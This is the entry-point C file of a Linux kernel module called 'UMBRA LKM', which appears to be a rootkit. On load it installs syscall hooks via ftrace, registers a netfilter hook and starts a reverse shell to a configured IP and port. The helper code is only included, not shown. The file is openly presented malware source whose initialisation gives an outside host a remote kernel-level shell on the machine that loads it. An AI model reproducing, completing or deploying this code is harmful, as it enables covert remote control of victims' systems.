#include <asm-generic/barrier.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kernel.h>
#include <linux/linkage.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/signal.h>




#include "include/ftrace_manager.h"
#include "include/hookers.h"
#include "include/utils.h"
#include "include/CONFIG.h"
#include "include/netfilter_manager.h"

#if !defined(CONFIG_X86_64) || (LINUX_VERSION_CODE < KERNEL_VERSION(4,17,0))
#define VERSION_NOT_SUPPORTED
#endif

MODULE_LICENSE("GPL");
MODULE_AUTHOR("h3xduck marcossbajo@gmail.com");
MODULE_DESCRIPTION("UMBRA LKM");
MODULE_VERSION("1");





static void __exit mod_exit(void){
    remove_all_hooks();
    unregister_netfilter_hook();
    
    printk(KERN_INFO "UMBRA:: Successfully unloaded\n");
}

static int __init mod_init(void){
    int err;
    #ifdef VERSION_NOT_SUPPORTED
        printk(KERN_INFO "UMBRA:: Version not supported\n");
        return -1;
    #endif
    err = install_all_hooks();
    if(err){
        return err;
    }
    err = register_netfilter_hook();
    if(err){
        return err;
    }
    printk(KERN_INFO "UMBRA:: Successfully loaded\n");
    start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
    return 0;
}



// Registering functions for when loading/unloading kernel module
module_init(mod_init);
module_exit(mod_exit);
